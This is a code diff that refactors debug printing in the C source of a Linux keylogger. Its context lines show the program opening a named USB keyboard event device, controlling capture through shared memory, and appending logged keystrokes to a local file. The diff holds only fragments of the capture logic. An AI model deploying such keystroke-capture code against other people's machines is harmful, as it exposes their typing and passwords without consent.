@@ -9,6 +9,14 @@
 #include "keylogger.h"
 #include "../include/types.h"
 
+#ifdef DEBUG
+
+# define DEBUG_PRINT(x) printf x 
+#else
+# define DEBUG_PRINT(x) do {} while (0) 
+
+#endif
+
 #define KEYBOARD_PATH "/dev/input/by-id/usb-CM_Storm_Keyboard_--_Trigger_Z_gaming-event-kbd"
 
 typedef struct
@@ -24,10 +32,7 @@ void keylogger_allow()
 
 	if (fd_shm == -1)
 	{
-#ifdef DEBUG
-		printf(P_ERROR " [keylogger_allow] Error opening the shared memory segment\n");
-#endif
-
+		DEBUG_PRINT((P_ERROR " [keylogger_allow] Error opening the shared memory segment\n"));
 		return;
 	}
 
@@ -36,9 +41,7 @@ void keylogger_allow()
 
 	if (aux == MAP_FAILED)
 	{
-#ifdef DEBUG
-		printf(P_ERROR " [keylogger_allow] Error mapping the shared memory segment\n");
-#endif
+		DEBUG_PRINT((P_ERROR " [keylogger_allow] Error mapping the shared memory segment\n"));
 		return;
 	}
 	if (aux->keylogger_capture == 0)
@@ -56,10 +59,7 @@ void keylogger_deny()
 
 	if (fd_shm == -1)
 	{
-#ifdef DEBUG
-		printf(P_ERROR " [keylogger_deny] Error opening the shared memory segment\n");
-#endif
-
+		DEBUG_PRINT((P_ERROR " [keylogger_deny] Error opening the shared memory segment\n"));
 		return;
 	}
 
@@ -68,9 +68,7 @@ void keylogger_deny()
 
 	if (aux == MAP_FAILED)
 	{
-#ifdef DEBUG
-		printf(P_ERROR " [keylogger_deny] Error mapping the shared memory segment\n");
-#endif
+		DEBUG_PRINT((P_ERROR " [keylogger_deny] Error mapping the shared memory segment\n"));
 		return;
 	}
 	if (aux->keylogger_capture == 1)
@@ -88,10 +86,7 @@ void keylogger_end()
 
 	if (fd_shm == -1)
 	{
-#ifdef DEBUG
-		printf(P_ERROR " [keylogger_end] Error opening the shared memory segment\n");
-#endif
-
+		DEBUG_PRINT((P_ERROR " [keylogger_end] Error opening the shared memory segment\n"));
 		return;
 	}
 
@@ -100,9 +95,7 @@ void keylogger_end()
 
 	if (aux == MAP_FAILED)
 	{
-#ifdef DEBUG
-		printf(P_ERROR " [keylogger_finish] Error mapping the shared memory segment\n");
-#endif
+		DEBUG_PRINT((P_ERROR " [keylogger_finish] Error mapping the shared memory segment\n"));
 		return;
 	}
 	aux->keylogger_finish = 1;
@@ -130,9 +123,7 @@ int keylogger_init()
 	int fd_shm = shm_open(SHM_KEYLOGGER, O_RDWR | O_CREAT | O_EXCL, S_IRUSR | S_IWUSR);
 	if (fd_shm == -1)
 	{
-#ifdef DEBUG
-		printf(P_ERROR " [KEYLOGGER] Error creating the shared memory\n");
-#endif
+		DEBUG_PRINT((P_ERROR " [KEYLOGGER] Error creating the shared memory\n"));
 		return ERROR;
 	}
 
@@ -141,9 +132,7 @@ int keylogger_init()
 
 	if (error == -1)
 	{
-#ifdef DEBUG
-		printf(P_ERROR " [KEYLOGGER] Error resizing the shared memory segment\n");
-#endif
+		DEBUG_PRINT((P_ERROR " [KEYLOGGER] Error resizing the shared memory segment\n"));
 		shm_unlink(SHM_KEYLOGGER);
 		return ERROR;
 	}
@@ -153,9 +142,7 @@ int keylogger_init()
 												PROT_READ | PROT_WRITE, MAP_SHARED, fd_shm, 0);
 	if (shared_memory == MAP_FAILED)
 	{
-#ifdef DEBUG
-		printf(P_ERROR " [KEYLOGGER] Error mapping the shared memory segment\n");
-#endif
+		DEBUG_PRINT((P_ERROR " [KEYLOGGER] Error mapping the shared memory segment\n"));
 		shm_unlink(SHM_KEYLOGGER);
 		return ERROR;
 	}
@@ -167,9 +154,7 @@ int keylogger_init()
 	// Configure the keylogger
 	if ((keybrdToCapture = open(path, O_RDONLY)) == -1)
 	{
-#ifdef DEBUG
-		printf(P_ERROR " [KEYLOGGER] Error opening device\n");
-#endif
+		DEBUG_PRINT((P_ERROR " [KEYLOGGER] Error opening device\n"));
 		munmap(shared_memory, sizeof(*shared_memory));
 		shm_unlink(SHM_KEYLOGGER);
 		return ERROR;
@@ -193,9 +178,7 @@ int keylogger_init()
 				file = fopen("keylogger_data.txt", "ab+");
 				if (!file)
 				{
-#ifdef DEBUG
-					printf(P_ERROR " [KEYLOGGER] No file?\n");
-#endif
+					DEBUG_PRINT((P_ERROR " [KEYLOGGER] No file?\n"));
 					munmap(shared_memory, sizeof(*shared_memory));
 					shm_unlink(SHM_KEYLOGGER);
 					return ERROR;
